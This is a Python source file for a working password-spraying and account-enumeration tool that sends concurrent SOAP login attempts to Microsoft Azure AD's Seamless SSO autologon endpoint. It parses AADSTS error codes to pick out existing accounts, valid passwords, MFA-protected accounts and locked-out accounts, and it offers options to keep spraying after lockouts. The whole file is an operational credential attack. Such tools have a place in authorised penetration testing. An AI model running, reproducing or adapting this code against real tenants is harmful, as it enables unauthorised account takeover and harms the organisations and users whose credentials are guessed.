import grequests
import re
import argparse
from rich.theme import Theme
from rich.console import Console
import sys
import time

# TODO:

parser = argparse.ArgumentParser(description='Brute force tool to enumerate emails and spray passwords.')
parser.add_argument('username_file', help="File containing usernames (e.g. 'first.last@contoso.com' or 'admin-first.last@contoso.onmicrosoft.com::tennant-name.com').")
parser.add_argument('password_file', help="File containing passwords.")
parser.add_argument('--timeout', default=3, help='Timeout period for every try/request.')
parser.add_argument('-v', '--verbose', action="store_true", help='Verbose output.')
parser.add_argument('--guid', default="7c9e6679-7425-40de-944b-e07fc1f90ae7", help='Device guid for the SSO  request.')
parser.add_argument('-ps', '--password_sleep', default=10, help='Sleep time in seconds between passwords.')

mxg = parser.add_mutually_exclusive_group(required=True)
mxg.add_argument('--continue_brute', action="store_true", help='Brute force continues after locked out accounts were found.')
mxg.add_argument('--continue_but_skip_lockedouts', action="store_true", help='Brute force continues after locked out accounts were found, but skips the accounts that were locked out.')
mxg.add_argument('--stop_brute', action="store_true", help='Brute force stops after a locked out account was found.')
arguments = parser.parse_args()

custom_theme = Theme({
    "cyan" : "bold cyan",
    "orange": "bold dark_orange",
    "red": "bold red",
    "green": "bold green"
})
console = Console(theme=custom_theme, color_system="windows", width=800)


def build_urls(tennant_name, optional_device_guid):

    urls = [
        f'https://autologon.microsoftazuread-sso.com/{tennant_name}/winauth/trust/2005/usernamemixed?client-request-id={optional_device_guid}'
    ]
    return urls


headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
           'Content-Type': 'application/xml',
           'Accept-Encoding': 'gzip, deflate',
           'Accept': '*/*',
           'Connection': 'keep-alive'}


def construct_list_from_file(file):
    output_list = []
    with open(file, 'r') as f:
        while line := f.readline().rstrip():
            output_list.append(line)
    return output_list


def build_user_password_combinations(username_file, password_file):
    user_pass_list = []

    with open(password_file, 'r') as pw_f:
        while password_line := pw_f.readline().rstrip():
            with open(username_file, 'r') as user_f:
                while username_line := user_f.readline().rstrip():
                    # print(f"{username_line} - {password_line}")
                    user_and_password_combination = [username_line, password_line]
                    user_pass_list.append(user_and_password_combination)
    return user_pass_list


def build_xml_data(username, password):
    # Whatever you do, DO NOT, and I repeat DO NOT have the quotes (""") at the start and finish of the following string on a newline. You will waste 2,5 hours of your precious life
    xml_data = f"""<?xml version="1.0" encoding="UTF-8"?>
    <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
    <s:Header><a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue
    </a:Action><a:MessageID>urn:uuid:36a6762f-40a9-4279-b4e6-b01c944b5698
    </a:MessageID><a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>
    <a:To s:mustUnderstand="1">https://autologon.microsoftazuread-sso.com/dewi.onmicrosoft.com/winauth/trust/2005/usernamemixed?client-request-id=30cad7ca-797c-4dba-81f6-8b01f6371013</a:To>
    <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
    <u:Timestamp u:Id="_0"><u:Created>2019-01-02T14:30:02.068Z</u:Created><u:Expires>2021-10-02T14:40:02.068Z</u:Expires></u:Timestamp>
    <o:UsernameToken u:Id="uuid-ec4527b8-bbb0-4cbb-88cf-abe27fe60977"><o:Username>{username}</o:Username><o:Password>{password}</o:Password></o:UsernameToken></o:Security></s:Header>
    <s:Body><trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
    <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy"><a:EndpointReference><a:Address>urn:federation:MicrosoftOnline</a:Address></a:EndpointReference></wsp:AppliesTo>
    <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
    <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType></trust:RequestSecurityToken></s:Body></s:Envelope>"""
    return xml_data


def handle_errorcodes(error_code, email, password, tennant_name):
    successful_credentials = []
    is_locked_out = False
    # Error codes and logic stolen (and slightly modified) from https://github.com/dafthack/MSOLSpray/blob/master/MSOLSpray.ps1#L111
    if error_code.startswith("AADSTS"):
        if error_code == "AADSTS50034":
            return_error_message = f"The user account \'{email}\' does not exist in the \'{tennant_name}\' directory. To sign into this application, the account must be added to the directory."
        elif error_code == "AADSTS50053":
            return_error_message = f"The user account \'{email}\' is locked, you've tried to sign in too many times with an incorrect user ID or password. Or Azure smart lock was engaged, so your IP has been flagged as malicious."

            if arguments.continue_brute:
                console.print(f"[WARNING]: The user account \'{email}\' is locked out. But you chose to keep going.", style="orange")
            elif arguments.continue_but_skip_lockedouts:
                is_locked_out = True
                console.print(f"[WARNING]: The user account \'{email}\' is locked out and will be skipped for the remaining passwords.", style="orange")
            elif arguments.stop_brute:
                console.print(f"[ERROR]: The user account \'{email}\' is locked out. Stopping the brute force now.", style="red")
                sys.exit()
        elif error_code == "AADSTS50056":
            return_error_message = f"The user account \'{email}\' exists but does not have a password in Azure AD"
        elif error_code == "AADSTS50126":
            return_error_message = f"The password provided for user account \'{email}\' was wrong."
        elif error_code == "AADSTS80014":
            return_error_message = f"The user account \'{email}\' exists, but the maximum Pass-through Authentication time was exceeded."
            successful_credentials = [email, password]
        elif error_code == "AADSTS50128" or error_code == "AADSTS50059" or error_code == "AADSTS90002":
            return_error_message = f"The tennant \'{tennant_name}\' that was provided is invalid."
            return_error_message += f" The 'NameSpaceType' shouldn't be 'Unknown' in the following URL: \'https://login.microsoftonline.com/getuserrealm.srf?login=test@{tennant_name}&xml=1\'"
        elif error_code == "AADSTS50158" or error_code == "AADSTS50079" or error_code == "AADSTS50076":
            return_error_message = f"The response shows that MFA was hit so either DUO, OKTA or something else is being used."
            successful_credentials = [email, password]
        elif error_code == "AADSTS50057":
            return_error_message = f"The user object in Active Directory backing the \'{email}\' account has been disabled."
        elif error_code == "AADSTS50055":
            return_error_message = f"The user's password is expired, and therefore their login or session was ended."
            successful_credentials = [email, password]
        elif error_code == "AADSTS900023":
            return_error_message = f"The specified tenant identifier \'{tennant_name}\' is neither a valid DNS name, nor a valid external domain."
        else:
            return_error_message = f"\'{email}\' - {error_code}"
    else:
        return_error_message = f"\'{email}\' - {error_code}"
    return return_error_message, successful_credentials, is_locked_out


def get_credentials_from_response(response_string):
    username_from_request_in_response = re.search(r'<o:Username>(.*?)</o:Username>', response_string).group(1)
    password_from_request_in_response = re.search(r'<o:Password>(.*?)</o:Password>', response_string).group(1)
    return username_from_request_in_response, password_from_request_in_response


# The tennant cant be different than the domain in the e-mailaddress of the user.
# So people can provide the actual tennant name using '::', for example: test@mycompany.tld::contoso.com
# contoso.com will therefore be the real_tennant_name
def get_real_tennant_name(username_line):
    if "::" in username_line:
        real_tennant_name = username_line.split("::")[1]
    else:
        real_tennant_name = username_line.split("@")[1]
    return real_tennant_name


def build_list_of_requests_per_password(user_list, password):
    requests_to_be_sent = []
    for user in user_list:
        username = user.split("::")[0]
        xml_data = build_xml_data(username, password)

        real_tennant_name = get_real_tennant_name(user)
        urls = build_urls(real_tennant_name, arguments.guid)
        requests_to_be_sent.append(grequests.post(urls[0], data=xml_data, timeout=arguments.timeout, headers=headers))
    return requests_to_be_sent


def main():
    valid_credential_list = []

    user_pw_list = build_user_password_combinations(arguments.username_file, arguments.password_file)

    password_list = construct_list_from_file(arguments.password_file)
    username_list = construct_list_from_file(arguments.username_file)

    successful_users = []
    locked_users = []

    console.print(f"[INFO]: Starting brute force..", style="cyan")

    for password in password_list:
        time.sleep(arguments.password_sleep)

        users_to_request = [x for x in username_list if x not in successful_users]
        users_to_request = [x for x in users_to_request if x not in locked_users]
        request_list = build_list_of_requests_per_password(users_to_request, password)

        responses = grequests.map(request_list)
        for response in responses:
            if response.status_code == 400:
                for combination in user_pw_list:

                    username_from_file = combination[0].split("::")[0]
                    password_from_file = combination[1]
                    username_from_request_in_response, password_from_request_in_response = get_credentials_from_response(response.request.body)

                    if username_from_file == username_from_request_in_response and password_from_file == password_from_request_in_response:
                        response_xml_body_string = response.text
                        full_error_string = re.search(r'<psf:text>(.*?)</psf:text>', response_xml_body_string).group(1)
                        error_code = full_error_string.split(':')[0]
                        error_message, valid_creds, account_is_locked = handle_errorcodes(error_code, username_from_file, password_from_file, re.search(r'https://autologon.microsoftazuread-sso.com/(.*?)/winauth/trust/2005/usernamemixed', response.request.url).group(1))
                        if account_is_locked:
                            locked_users.append(combination[0])
                        if arguments.verbose:
                            console.print(f"[INFO]: {error_message}", style="cyan")
                        if valid_creds:
                            valid_credential_list.append(valid_creds)
                            successful_users.append(combination[0])

            elif response.status_code == 200:
                username, password = get_credentials_from_response(response.request.body)
                valid_credential_list.append([username, password])
                tennant = re.search(r'https://autologon.microsoftazuread-sso.com/(.*?)/winauth/trust/2005/usernamemixed', response.request.url).group(1)
                if username.split("@")[1] == tennant:
                    successful_users.append(f"{username}")
                else:
                    successful_users.append(f"{username}::{tennant}")

    if valid_credential_list:
        console.print(f"[INFO]: Finishing up brute forcing.. found {len(valid_credential_list)} valid credentials.", style="cyan")
        for val_creds in valid_credential_list:
            console.print(f"[SUCCESS]: {val_creds[0]} - {val_creds[1]}", style="green")
    else:
        console.print(f"[INFO]: Finishing up brute forcing.. found no valid credentials.", style="cyan")


main()
